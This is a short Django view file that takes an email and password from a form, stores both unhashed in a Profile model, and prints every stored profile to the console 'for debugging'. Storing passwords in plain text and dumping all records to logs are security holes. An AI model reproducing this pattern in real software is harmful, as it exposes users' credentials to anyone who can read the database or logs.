from django.shortcuts import render, redirect
from .models import Profile

def index(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        Profile.objects.create(email=email, password=password)
        return render(request, 'index.html', {'success': True})
    # Consulta todos los perfiles para depuración:
    print(Profile.objects.all())
    return render(request, 'index.html')


